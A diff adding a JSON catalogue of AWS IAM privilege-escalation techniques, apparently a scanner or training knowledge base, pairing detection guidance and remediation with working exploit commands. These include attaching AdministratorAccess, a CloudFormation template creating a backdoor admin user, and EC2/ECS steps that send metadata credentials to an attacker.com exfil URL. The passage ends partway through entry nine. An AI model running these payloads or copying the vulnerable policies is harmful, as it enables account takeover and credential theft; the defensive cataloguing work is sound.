@@ -1,0 +1,970 @@
+{
+  "category": "AWS IAM Privilege Escalation",
+  "description": "AWS IAM privilege escalation occurs when an attacker with limited IAM permissions exploits overly permissive policies, role trust relationships, or service-linked capabilities to gain elevated access. These techniques allow lateral movement and vertical privilege escalation within AWS accounts, often leading to full administrative control.",
+  "entries": [
+    {
+      "id": "AWS-IAM-PRIV-001",
+      "cwe": "CWE-269",
+      "name": "Privilege Escalation via iam:CreatePolicyVersion",
+      "severity": "CRITICAL",
+      "description": "An IAM principal with iam:CreatePolicyVersion can create a new version of a managed policy with arbitrary permissions and set it as the default, effectively granting themselves any permission.",
+      "how_it_works": "AWS managed policies support up to 5 versions. When a new version is created with --set-as-default, it immediately becomes active. An attacker creates a new policy version containing Action:* Resource:* and sets it as default, escalating to full admin.",
+      "preconditions": [
+        "IAM principal has iam:CreatePolicyVersion permission",
+        "Principal has a customer-managed policy attached (not AWS-managed)",
+        "Policy has fewer than 5 versions or attacker can delete old versions"
+      ],
+      "impact": [
+        "Full administrative access to the AWS account",
+        "Ability to read/modify/delete any resource",
+        "Persistence via creating new IAM users or roles",
+        "Data exfiltration from all services"
+      ],
+      "affected_components": ["AWS IAM", "All AWS services (via escalated permissions)"],
+      "detection_guidance": "Scan IAM policies and IaC templates for iam:CreatePolicyVersion in Action fields. In CloudTrail, monitor CreatePolicyVersion events where the new version document contains Action:* or Resource:*. Flag any non-admin principal with this permission.",
+      "exploit_payloads": [
+        "aws iam create-policy-version --policy-arn arn:aws:iam::123456789012:policy/MyPolicy --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}' --set-as-default",
+        "aws iam list-policy-versions --policy-arn arn:aws:iam::123456789012:policy/MyPolicy",
+        "aws iam delete-policy-version --policy-arn arn:aws:iam::123456789012:policy/MyPolicy --version-id v1"
+      ],
+      "vulnerable_code": "# Terraform - overly permissive IAM policy\nresource \"aws_iam_policy\" \"developer\" {\n  name = \"developer-policy\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Effect   = \"Allow\"\n      Action   = \"iam:CreatePolicyVersion\"\n      Resource = \"*\"\n    }]\n  })\n}",
+      "safe_code": "# Terraform - deny policy version creation\nresource \"aws_iam_policy\" \"developer\" {\n  name = \"developer-policy\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Effect   = \"Allow\"\n      Action   = [\"s3:GetObject\", \"s3:PutObject\"]\n      Resource = \"arn:aws:s3:::my-bucket/*\"\n    },\n    {\n      Effect   = \"Deny\"\n      Action   = [\"iam:CreatePolicyVersion\", \"iam:SetDefaultPolicyVersion\"]\n      Resource = \"*\"\n    }]\n  })\n}",
+      "remediation": [
+        "Remove iam:CreatePolicyVersion from non-admin IAM policies",
+        "Use AWS-managed policies which cannot be modified by users",
+        "Apply permissions boundaries to restrict maximum permissions",
+        "Enable CloudTrail and set up alerts for CreatePolicyVersion API calls",
+        "Use SCPs to restrict policy modification at the organization level"
+      ],
+      "references": [
+        "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
+        "https://cwe.mitre.org/data/definitions/269.html",
+        "https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_managed-versioning.html"
+      ],
+      "tags": ["iam", "privilege-escalation", "policy-manipulation", "rhino-method-1"]
+    },
+    {
+      "id": "AWS-IAM-PRIV-002",
+      "cwe": "CWE-269",
+      "name": "Privilege Escalation via iam:SetDefaultPolicyVersion",
+      "severity": "CRITICAL",
+      "description": "An IAM principal with iam:SetDefaultPolicyVersion can switch the active version of a managed policy to a previously created version that may contain more permissive statements.",
+      "how_it_works": "Managed policies retain up to 5 versions. If a previous version contained broader permissions (e.g., before a policy was tightened), an attacker can revert to that permissive version by calling SetDefaultPolicyVersion. This does not create a new version but reactivates an old one.",
+      "preconditions": [
+        "IAM principal has iam:SetDefaultPolicyVersion permission",
+        "A previous policy version exists with more permissive statements",
+        "The target policy is customer-managed (not AWS-managed)"
+      ],
+      "impact": [
+        "Revert security-tightening changes to IAM policies",
+        "Gain permissions that were previously revoked",
+        "Potential full admin access if an old version was permissive"
+      ],
+      "affected_components": ["AWS IAM"],
+      "detection_guidance": "Scan for iam:SetDefaultPolicyVersion in IAM policies. Monitor CloudTrail for SetDefaultPolicyVersion events. Audit policy version history for versions with overly broad permissions that should be deleted.",
+      "exploit_payloads": [
+        "aws iam list-policy-versions --policy-arn arn:aws:iam::123456789012:policy/MyPolicy",
+        "aws iam get-policy-version --policy-arn arn:aws:iam::123456789012:policy/MyPolicy --version-id v1",
+        "aws iam set-default-policy-version --policy-arn arn:aws:iam::123456789012:policy/MyPolicy --version-id v1"
+      ],
+      "vulnerable_code": "# CDK - granting SetDefaultPolicyVersion\nconst devPolicy = new iam.PolicyStatement({\n  effect: iam.Effect.ALLOW,\n  actions: ['iam:SetDefaultPolicyVersion'],\n  resources: ['*'],\n});\ndevRole.addToPolicy(devPolicy);",
+      "safe_code": "# CDK - explicit deny for policy version manipulation\nconst denyPolicyManipulation = new iam.PolicyStatement({\n  effect: iam.Effect.DENY,\n  actions: [\n    'iam:CreatePolicyVersion',\n    'iam:SetDefaultPolicyVersion',\n    'iam:DeletePolicyVersion'\n  ],\n  resources: ['*'],\n});\ndevRole.addToPolicy(denyPolicyManipulation);",
+      "remediation": [
+        "Remove iam:SetDefaultPolicyVersion from non-admin policies",
+        "Delete old permissive policy versions after tightening policies",
+        "Use AWS-managed policies where possible",
+        "Implement SCPs to restrict this action"
+      ],
+      "references": [
+        "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
+        "https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_managed-versioning.html"
+      ],
+      "tags": ["iam", "privilege-escalation", "policy-version", "rhino-method-2"]
+    },
+    {
+      "id": "AWS-IAM-PRIV-003",
+      "cwe": "CWE-269",
+      "name": "Privilege Escalation via iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction",
+      "severity": "CRITICAL",
+      "description": "An attacker with iam:PassRole, lambda:CreateFunction, and lambda:InvokeFunction can create a Lambda function that executes with a high-privilege role, then invoke it to perform privileged actions.",
+      "how_it_works": "The attacker creates a Lambda function and passes it an existing high-privilege role (e.g., an admin role used by another service). The Lambda function code performs privileged operations such as creating a new admin user. When invoked, the function executes with the passed role's permissions, not the attacker's.",
+      "preconditions": [
+        "IAM principal has iam:PassRole permission (on a high-privilege role)",
+        "IAM principal has lambda:CreateFunction permission",
+        "IAM principal has lambda:InvokeFunction permission",
+        "A high-privilege IAM role exists with a trust policy that allows lambda.amazonaws.com to assume it"
+      ],
+      "impact": [
+        "Execute arbitrary code with the privileges of the passed role",
+        "Create new admin users or access keys",
+        "Access any resource the passed role can access",
+        "Exfiltrate data from S3, DynamoDB, Secrets Manager, etc."
+      ],
+      "affected_components": ["AWS IAM", "AWS Lambda"],
+      "detection_guidance": "Scan for policies granting iam:PassRole with Resource:* combined with lambda:CreateFunction. In CloudTrail, monitor CreateFunction events and correlate the Role ARN with high-privilege roles. Flag Lambda functions created with admin roles.",
+      "exploit_payloads": [
+        "# Create malicious Lambda function code\nimport boto3\ndef handler(event, context):\n    client = boto3.client('iam')\n    client.attach_user_policy(\n        UserName='attacker',\n        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\n    )\n    return 'escalated'",
+        "zip function.zip lambda_function.py",
+        "aws lambda create-function --function-name escalate --runtime python3.12 --role arn:aws:iam::123456789012:role/AdminRole --handler lambda_function.handler --zip-file fileb://function.zip",
+        "aws lambda invoke --function-name escalate output.json"
+      ],
+      "vulnerable_code": "# Terraform - PassRole with wildcard resource\nresource \"aws_iam_policy\" \"developer\" {\n  name = \"developer-policy\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect   = \"Allow\"\n        Action   = \"iam:PassRole\"\n        Resource = \"*\"\n      },\n      {\n        Effect   = \"Allow\"\n        Action   = [\"lambda:CreateFunction\", \"lambda:InvokeFunction\"]\n        Resource = \"*\"\n      }\n    ]\n  })\n}",
+      "safe_code": "# Terraform - restrict PassRole to specific Lambda execution role\nresource \"aws_iam_policy\" \"developer\" {\n  name = \"developer-policy\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect   = \"Allow\"\n        Action   = \"iam:PassRole\"\n        Resource = \"arn:aws:iam::123456789012:role/LambdaBasicExecutionRole\"\n        Condition = {\n          StringEquals = {\n            \"iam:PassedToService\" = \"lambda.amazonaws.com\"\n          }\n        }\n      },\n      {\n        Effect   = \"Allow\"\n        Action   = [\"lambda:CreateFunction\", \"lambda:InvokeFunction\"]\n        Resource = \"arn:aws:lambda:us-east-1:123456789012:function:my-app-*\"\n      }\n    ]\n  })\n}",
+      "remediation": [
+        "Restrict iam:PassRole to specific role ARNs, never use Resource:*",
+        "Add iam:PassedToService condition to limit which services can receive the role",
+        "Apply permissions boundaries to all roles that can be passed",
+        "Use separate low-privilege roles for Lambda functions",
+        "Monitor Lambda function creation with privileged roles via CloudTrail"
+      ],
+      "references": [
+        "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
+        "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html"
+      ],
+      "tags": ["iam", "lambda", "passrole", "privilege-escalation", "rhino-method-3"]
+    },
+    {
+      "id": "AWS-IAM-PRIV-004",
+      "cwe": "CWE-269",
+      "name": "Privilege Escalation via iam:PassRole + ec2:RunInstances",
+      "severity": "CRITICAL",
+      "description": "An attacker with iam:PassRole and ec2:RunInstances can launch an EC2 instance with a high-privilege instance profile, then access the instance metadata service to obtain temporary credentials for that role.",
+      "how_it_works": "The attacker launches an EC2 instance and attaches a high-privilege instance profile via PassRole. Once the instance is running, the attacker connects (via SSM, SSH, or user data script) and queries the instance metadata service at 169.254.169.254 to retrieve temporary credentials for the attached role. These credentials can be used from anywhere.",
+      "preconditions": [
+        "IAM principal has iam:PassRole on a high-privilege role",
+        "IAM principal has ec2:RunInstances permission",
+        "An instance profile exists linked to a high-privilege role",
+        "The role's trust policy allows ec2.amazonaws.com",
+        "Network access to the launched instance (or use of user data to exfiltrate credentials)"
+      ],
+      "impact": [
+        "Obtain temporary credentials for any passable role",
+        "Full account compromise if an admin instance profile exists",
+        "Lateral movement to other services",
+        "Credentials valid for up to 6 hours by default"
+      ],
+      "affected_components": ["AWS IAM", "AWS EC2", "EC2 Instance Metadata Service"],
+      "detection_guidance": "Scan for iam:PassRole + ec2:RunInstances in IAM policies. Monitor RunInstances CloudTrail events and check if the instance profile role has elevated permissions. Detect credential use from unexpected IP ranges (outside VPC).",
+      "exploit_payloads": [
+        "aws ec2 run-instances --image-id ami-0abcdef1234567890 --instance-type t3.micro --iam-instance-profile Name=AdminInstanceProfile --key-name attacker-key --user-data '#!/bin/bash\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole > /tmp/creds.json\ncurl -X POST https://attacker.com/exfil -d @/tmp/creds.json'",
+        "# From inside the instance:\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole",
+        "# With IMDSv2:\nTOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole"
+      ],
+      "vulnerable_code": "# Terraform - unrestricted PassRole for EC2\nresource \"aws_iam_policy\" \"developer\" {\n  name = \"developer-policy\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect   = \"Allow\"\n        Action   = \"iam:PassRole\"\n        Resource = \"*\"\n      },\n      {\n        Effect   = \"Allow\"\n        Action   = \"ec2:RunInstances\"\n        Resource = \"*\"\n      }\n    ]\n  })\n}",
+      "safe_code": "# Terraform - restrict PassRole to specific low-privilege role and require IMDSv2\nresource \"aws_iam_policy\" \"developer\" {\n  name = \"developer-policy\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect   = \"Allow\"\n        Action   = \"iam:PassRole\"\n        Resource = \"arn:aws:iam::123456789012:role/EC2AppRole\"\n        Condition = {\n          StringEquals = {\n            \"iam:PassedToService\" = \"ec2.amazonaws.com\"\n          }\n        }\n      },\n      {\n        Effect   = \"Allow\"\n        Action   = \"ec2:RunInstances\"\n        Resource = \"*\"\n        Condition = {\n          StringEquals = {\n            \"ec2:MetadataHttpTokens\" = \"required\"\n          }\n        }\n      }\n    ]\n  })\n}",
+      "remediation": [
+        "Restrict iam:PassRole to specific low-privilege role ARNs",
+        "Use iam:PassedToService condition key",
+        "Require IMDSv2 (HttpTokens=required) to mitigate SSRF-based credential theft",
+        "Apply permissions boundaries to instance profile roles",
+        "Monitor RunInstances events for unexpected instance profile attachments",
+        "Restrict ec2:RunInstances to specific VPCs and subnets"
+      ],
+      "references": [
+        "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
+        "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html"
+      ],
+      "tags": ["iam", "ec2", "passrole", "instance-profile", "imds", "privilege-escalation", "rhino-method-4"]
+    },
+    {
+      "id": "AWS-IAM-PRIV-005",
+      "cwe": "CWE-269",
+      "name": "Privilege Escalation via iam:PassRole + ecs:RegisterTaskDefinition + ecs:RunTask",
+      "severity": "CRITICAL",
+      "description": "An attacker can register an ECS task definition with a high-privilege task role and run it to execute arbitrary code with elevated permissions.",
+      "how_it_works": "The attacker registers a new ECS task definition specifying a high-privilege task role ARN. The container image is set to one the attacker controls (or a public image with a command override). When the task runs, the container inherits the task role's credentials via the ECS credential endpoint, enabling privileged API calls.",
+      "preconditions": [
+        "IAM principal has iam:PassRole on a high-privilege role",
+        "IAM principal has ecs:RegisterTaskDefinition permission",
+        "IAM principal has ecs:RunTask permission",
+        "An ECS cluster exists",
+        "A high-privilege role with ecs-tasks.amazonaws.com trust exists"
+      ],
+      "impact": [
+        "Execute arbitrary code with task role permissions",
+        "Access secrets, databases, S3 buckets accessible to the task role",
+        "Full account compromise if an admin task role is available"
+      ],
+      "affected_components": ["AWS IAM", "AWS ECS", "AWS Fargate"],
+      "detection_guidance": "Scan for policies granting iam:PassRole + ecs:RegisterTaskDefinition. Monitor CloudTrail for RegisterTaskDefinition events with unexpected task role ARNs. Alert when task definitions reference roles outside the expected set.",
+      "exploit_payloads": [
+        "aws ecs register-task-definition --family escalation-task --task-role-arn arn:aws:iam::123456789012:role/AdminTaskRole --container-definitions '[{\"name\":\"exploit\",\"image\":\"amazonlinux:2\",\"command\":[\"sh\",\"-c\",\"curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | curl -X POST -d @- https://attacker.com/exfil\"],\"essential\":true,\"memory\":512}]' --requires-compatibilities FARGATE --network-mode awsvpc --cpu 256 --memory 512",
+        "aws ecs run-task --cluster my-cluster --task-definition escalation-task --launch-type FARGATE --network-configuration '{\"awsvpcConfiguration\":{\"subnets\":[\"subnet-12345\"],\"assignPublicIp\":\"ENABLED\"}}'"
+      ],
+      "vulnerable_code": "# CDK - PassRole with wildcard for ECS tasks\nconst policy = new iam.PolicyStatement({\n  actions: ['iam:PassRole'],\n  resources: ['*'],\n});\nconst ecsPolicy = new iam.PolicyStatement({\n  actions: ['ecs:RegisterTaskDefinition', 'ecs:RunTask'],\n  resources: ['*'],\n});\ndevRole.addToPolicy(policy);\ndevRole.addToPolicy(ecsPolicy);",
+      "safe_code": "# CDK - restrict PassRole to specific ECS task role\nconst policy = new iam.PolicyStatement({\n  actions: ['iam:PassRole'],\n  resources: ['arn:aws:iam::123456789012:role/EcsAppTaskRole'],\n  conditions: {\n    StringEquals: {\n      'iam:PassedToService': 'ecs-tasks.amazonaws.com',\n    },\n  },\n});\nconst ecsPolicy = new iam.PolicyStatement({\n  actions: ['ecs:RegisterTaskDefinition', 'ecs:RunTask'],\n  resources: ['*'],\n  conditions: {\n    ArnEquals: {\n      'ecs:cluster': 'arn:aws:ecs:us-east-1:123456789012:cluster/my-cluster',\n    },\n  },\n});\ndevRole.addToPolicy(policy);\ndevRole.addToPolicy(ecsPolicy);",
+      "remediation": [
+        "Restrict iam:PassRole to specific ECS task role ARNs",
+        "Use iam:PassedToService condition key for ecs-tasks.amazonaws.com",
+        "Scope ecs:RegisterTaskDefinition and ecs:RunTask to specific clusters",
+        "Apply permissions boundaries to task roles",
+        "Monitor task definition registration for unexpected role assignments"
+      ],
+      "references": [
+        "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
+        "https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-iam-roles.html"
+      ],
+      "tags": ["iam", "ecs", "fargate", "passrole", "privilege-escalation", "rhino-method-5"]
+    },
+    {
+      "id": "AWS-IAM-PRIV-006",
+      "cwe": "CWE-269",
+      "name": "Privilege Escalation via iam:PassRole + cloudformation:CreateStack",
+      "severity": "CRITICAL",
+      "description": "An attacker with iam:PassRole and cloudformation:CreateStack can create a CloudFormation stack with a high-privilege service role, enabling creation of arbitrary AWS resources including new admin users.",
+      "how_it_works": "CloudFormation stacks can be created with a service role that CloudFormation assumes to create resources. If an attacker can pass a high-privilege role to CloudFormation, the stack template can include any resources (IAM users, policies, roles) that the service role has permission to create.",
+      "preconditions": [
+        "IAM principal has iam:PassRole on a high-privilege role",
+        "IAM principal has cloudformation:CreateStack permission",
+        "A high-privilege role with cloudformation.amazonaws.com trust exists"
+      ],
+      "impact": [
+        "Create arbitrary AWS resources via CloudFormation templates",
+        "Create new IAM admin users with access keys",
+        "Modify security groups, VPCs, and other infrastructure",
+        "Full account takeover"
+      ],
+      "affected_components": ["AWS IAM", "AWS CloudFormation"],
+      "detection_guidance": "Scan for iam:PassRole + cloudformation:CreateStack in policies. Monitor CreateStack CloudTrail events where RoleARN is a high-privilege role. Inspect stack templates for IAM resource creation.",
+      "exploit_payloads": [
+        "# Create malicious CloudFormation template\ncat > escalate.yaml << 'TMPL'\nAWSTemplateFormatVersion: '2010-09-09'\nResources:\n  AdminUser:\n    Type: AWS::IAM::User\n    Properties:\n      UserName: backdoor-admin\n      Policies:\n        - PolicyName: AdminAccess\n          PolicyDocument:\n            Version: '2012-10-17'\n            Statement:\n              - Effect: Allow\n                Action: '*'\n                Resource: '*'\n  AdminKey:\n    Type: AWS::IAM::AccessKey\n    Properties:\n      UserName: !Ref AdminUser\nOutputs:\n  AccessKeyId:\n    Value: !Ref AdminKey\n  SecretKey:\n    Value: !GetAtt AdminKey.SecretAccessKey\nTMPL",
+        "aws cloudformation create-stack --stack-name escalation-stack --template-body file://escalate.yaml --role-arn arn:aws:iam::123456789012:role/CFNAdminRole --capabilities CAPABILITY_NAMED_IAM",
+        "aws cloudformation describe-stacks --stack-name escalation-stack --query 'Stacks[0].Outputs'"
+      ],
+      "vulnerable_code": "# Terraform - PassRole wildcard with CloudFormation access\nresource \"aws_iam_policy\" \"developer\" {\n  name = \"developer-cfn-policy\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect   = \"Allow\"\n        Action   = \"iam:PassRole\"\n        Resource = \"*\"\n      },\n      {\n        Effect   = \"Allow\"\n        Action   = [\"cloudformation:CreateStack\", \"cloudformation:UpdateStack\"]\n        Resource = \"*\"\n      }\n    ]\n  })\n}",
+      "safe_code": "# Terraform - restrict PassRole and scope CFN to specific role and stack prefix\nresource \"aws_iam_policy\" \"developer\" {\n  name = \"developer-cfn-policy\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect   = \"Allow\"\n        Action   = \"iam:PassRole\"\n        Resource = \"arn:aws:iam::123456789012:role/CFNLimitedRole\"\n        Condition = {\n          StringEquals = {\n            \"iam:PassedToService\" = \"cloudformation.amazonaws.com\"\n          }\n        }\n      },\n      {\n        Effect   = \"Allow\"\n        Action   = [\"cloudformation:CreateStack\", \"cloudformation:UpdateStack\"]\n        Resource = \"arn:aws:cloudformation:us-east-1:123456789012:stack/app-*/*\"\n      }\n    ]\n  })\n}",
+      "remediation": [
+        "Restrict iam:PassRole to specific CloudFormation service roles with limited permissions",
+        "Apply permissions boundaries to CloudFormation service roles",
+        "Use SCPs to deny creation of IAM resources via CloudFormation for non-admin accounts",
+        "Scope cloudformation:CreateStack to specific stack name patterns",
+        "Enable CloudFormation drift detection and stack policy"
+      ],
+      "references": [
+        "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
+        "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/using-iam-servicerole.html"
+      ],
+      "tags": ["iam", "cloudformation", "passrole", "privilege-escalation", "rhino-method-6"]
+    },
+    {
+      "id": "AWS-IAM-PRIV-007",
+      "cwe": "CWE-269",
+      "name": "Privilege Escalation via iam:PassRole + glue:CreateDevEndpoint",
+      "severity": "CRITICAL",
+      "description": "An attacker with iam:PassRole and glue:CreateDevEndpoint can create a Glue development endpoint that runs with a high-privilege service role, providing SSH access to execute commands with those credentials.",
+      "how_it_works": "AWS Glue development endpoints are essentially managed EC2 instances for ETL development. When created, a service role is attached. The attacker passes a high-privilege role to the endpoint, SSHes into it, and uses the role credentials available from the instance metadata or environment to perform privileged operations.",
+      "preconditions": [
+        "IAM principal has iam:PassRole on a high-privilege role",
+        "IAM principal has glue:CreateDevEndpoint permission",
+        "A role with glue.amazonaws.com trust exists with elevated permissions",
+        "Attacker has an SSH public key to provide"
+      ],
+      "impact": [
+        "Interactive SSH access with high-privilege role credentials",
+        "Long-lived access (endpoint persists until deleted)",
+        "Full account compromise if admin role is passed",
+        "Data exfiltration from data lakes, S3, and databases"
+      ],
+      "affected_components": ["AWS IAM", "AWS Glue"],
+      "detection_guidance": "Scan for iam:PassRole + glue:CreateDevEndpoint. Monitor CreateDevEndpoint CloudTrail events. Alert on dev endpoints created with roles outside the expected Glue service roles. Note: Glue dev endpoints are a legacy feature being replaced by Glue Interactive Sessions.",
+      "exploit_payloads": [
+        "aws glue create-dev-endpoint --endpoint-name escalation-endpoint --role-arn arn:aws:iam::123456789012:role/GlueAdminRole --public-key 'ssh-rsa AAAA...' --number-of-nodes 2",
+        "aws glue get-dev-endpoint --endpoint-name escalation-endpoint",
+        "# SSH into the endpoint and use the attached role credentials\nssh -i private_key glue@<endpoint-public-address>\naws sts get-caller-identity"
+      ],
+      "vulnerable_code": "# CDK - PassRole wildcard for Glue\nconst gluePolicy = new iam.PolicyStatement({\n  actions: ['iam:PassRole', 'glue:CreateDevEndpoint', 'glue:GetDevEndpoint'],\n  resources: ['*'],\n});\ndataEngineerRole.addToPolicy(gluePolicy);",
+      "safe_code": "# CDK - restrict PassRole for Glue to specific role\nconst passRolePolicy = new iam.PolicyStatement({\n  actions: ['iam:PassRole'],\n  resources: ['arn:aws:iam::123456789012:role/GlueLimitedETLRole'],\n  conditions: {\n    StringEquals: {\n      'iam:PassedToService': 'glue.amazonaws.com',\n    },\n  },\n});\nconst gluePolicy = new iam.PolicyStatement({\n  actions: ['glue:CreateDevEndpoint', 'glue:GetDevEndpoint'],\n  resources: ['arn:aws:glue:us-east-1:123456789012:devEndpoint/team-*'],\n});\ndataEngineerRole.addToPolicy(passRolePolicy);\ndataEngineerRole.addToPolicy(gluePolicy);",
+      "remediation": [
+        "Restrict iam:PassRole to specific Glue service roles with minimal permissions",
+        "Prefer Glue Interactive Sessions over legacy dev endpoints",
+        "Apply permissions boundaries to Glue service roles",
+        "Monitor and auto-terminate unexpected Glue dev endpoints",
+        "Restrict network access from Glue endpoints"
+      ],
+      "references": [
+        "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
+        "https://docs.aws.amazon.com/glue/latest/dg/aws-glue-api-dev-endpoint.html"
+      ],
+      "tags": ["iam", "glue", "passrole", "dev-endpoint", "privilege-escalation", "rhino-method-7"]
+    },
+    {
+      "id": "AWS-IAM-PRIV-008",
+      "cwe": "CWE-269",
+      "name": "Privilege Escalation via iam:AttachUserPolicy",
+      "severity": "CRITICAL",
+      "description": "An IAM principal with iam:AttachUserPolicy can attach any AWS-managed or customer-managed policy to any user, including attaching AdministratorAccess to themselves.",
+      "how_it_works": "The AttachUserPolicy API associates a managed policy with an IAM user. If an attacker has this permission without resource restrictions, they can attach the AWS-managed AdministratorAccess policy to their own user, instantly gaining full admin permissions.",
+      "preconditions": [
+        "IAM principal has iam:AttachUserPolicy permission",
+        "Permission is not restricted by resource ARN to specific users/policies",
+        "Attacker knows their own IAM user ARN"
+      ],
+      "impact": [
+        "Immediate full administrative access to the AWS account",
+        "Ability to create persistence mechanisms",
+        "Data exfiltration and resource manipulation"
+      ],
+      "affected_components": ["AWS IAM"],
+      "detection_guidance": "Scan for iam:AttachUserPolicy with Resource:* in IAM policies. Monitor AttachUserPolicy CloudTrail events. Alert when AdministratorAccess or PowerUser policies are attached outside of approved processes.",
+      "exploit_payloads": [
+        "aws iam attach-user-policy --user-name attacker-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+        "aws iam list-attached-user-policies --user-name attacker-user",
+        "aws sts get-caller-identity"
+      ],
+      "vulnerable_code": "# Terraform - AttachUserPolicy without resource restriction\nresource \"aws_iam_policy\" \"team_lead\" {\n  name = \"team-lead-policy\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Effect   = \"Allow\"\n      Action   = \"iam:AttachUserPolicy\"\n      Resource = \"*\"\n    }]\n  })\n}",
+      "safe_code": "# Terraform - restrict to specific policies and users\nresource \"aws_iam_policy\" \"team_lead\" {\n  name = \"team-lead-policy\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect   = \"Allow\"\n        Action   = \"iam:AttachUserPolicy\"\n        Resource = \"arn:aws:iam::123456789012:user/team-*\"\n        Condition = {\n          ArnEquals = {\n            \"iam:PolicyARN\" = [\n              \"arn:aws:iam::123456789012:policy/DeveloperPolicy\",\n              \"arn:aws:iam::123456789012:policy/ReadOnlyPolicy\"\n            ]\n          }\n        }\n      },\n      {\n        Effect   = \"Deny\"\n        Action   = \"iam:AttachUserPolicy\"\n        Resource = \"*\"\n        Condition = {\n          ArnEquals = {\n            \"iam:PolicyARN\" = [\n              \"arn:aws:iam::aws:policy/AdministratorAccess\",\n              \"arn:aws:iam::aws:policy/IAMFullAccess\"\n            ]\n          }\n        }\n      }\n    ]\n  })\n}",
+      "remediation": [
+        "Never grant iam:AttachUserPolicy with Resource:*",
+        "Restrict to specific user ARNs and policy ARNs using conditions",
+        "Explicitly deny attachment of admin and IAM management policies",
+        "Use permissions boundaries to cap maximum permissions",
+        "Monitor AttachUserPolicy events in CloudTrail"
+      ],
+      "references": [
+        "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
+        "https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_boundaries.html"
+      ],
+      "tags": ["iam", "privilege-escalation", "policy-attachment", "rhino-method-8"]
+    },
+    {
+      "id": "AWS-IAM-PRIV-009",
+      "cwe": "CWE-269",
+      "name": "Privilege Escalation via iam:AttachRolePolicy",
+      "severity": "CRITICAL",
+      "description": "An IAM principal with iam:AttachRolePolicy can attach any managed policy to any role, including attaching AdministratorAccess to a role they can assume.",
+      "how_it_works": "The attacker attaches a highly privileged managed policy (such as AdministratorAccess) to a role that they can assume. After attachment, they assume the role and gain the elevated permissions. This can target any role including service roles, cross-account roles, or their own role.",
+      "preconditions": [
+        "IAM principal has iam:AttachRolePolicy permission without resource restriction",
+        "Attacker can assume at least one IAM role (via sts:AssumeRole, instance profile, etc.)"
+      ],
+      "impact": [
+        "Escalate any assumable role to admin",
+        "Compromise service roles used by Lambda, ECS, EC2",
+        "Persistent elevated access through modified roles"
+      ],
+      "affected_components": ["AWS IAM"],
+      "detection_guidance": "Scan for iam:AttachRolePolicy with Resource:* in policies. Monitor AttachRolePolicy CloudTrail events. Alert when admin-level policies are attached to roles outside of CI/CD pipelines or approved automation.",
+      "exploit_payloads": [
+        "aws iam attach-role-policy --role-name my-assumable-role --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+        "aws sts assume-role --role-arn arn:aws:iam::123456789012:role/my-assumable-role --role-session-name escalated",
+        "# Use returned credentials\nexport AWS_ACCESS_KEY_ID=<AccessKeyId>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey>\nexport AWS_SESSION_TOKEN=<SessionToken>\naws sts get-caller-identity"
+      ],
+      "vulnerable_code": "# CDK - unrestricted AttachRolePolicy\nconst adminPolicy = new iam.PolicyStatement({\n  actions: ['iam:AttachRolePolicy'],\n  resources: ['*'],\n});\ncicdRole.addToPolicy(adminPolicy);",
+      "safe_code": "# CDK - restrict to specific roles and deny admin policy attachment\nconst attachPolicy = new iam.PolicyStatement({\n  actions: ['iam:AttachRolePolicy'],\n  resources: ['arn:aws:iam::123456789012:role/app-*'],\n  conditions: {\n    ArnNotEquals: {\n      'iam:PolicyARN': [\n        'arn:aws:iam::aws:policy/AdministratorAccess',\n        'arn:aws:iam::aws:policy/IAMFullAccess',\n        'arn:aws:iam::aws:policy/PowerUserAccess',\n      ],\n    },\n  },\n});\ncicdRole.addToPolicy(attachPolicy);",
+      "remediation": [
+        "Restrict iam:AttachRolePolicy to specific role ARN patterns",
+        "Use iam:PolicyARN condition to deny attachment of admin policies",
+        "Apply permissions boundaries to all roles",
+        "Use SCPs to restrict policy attachment at the organization level",
+        "Monitor and alert on AttachRolePolicy calls"
+      ],
+      "references": [
+        "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
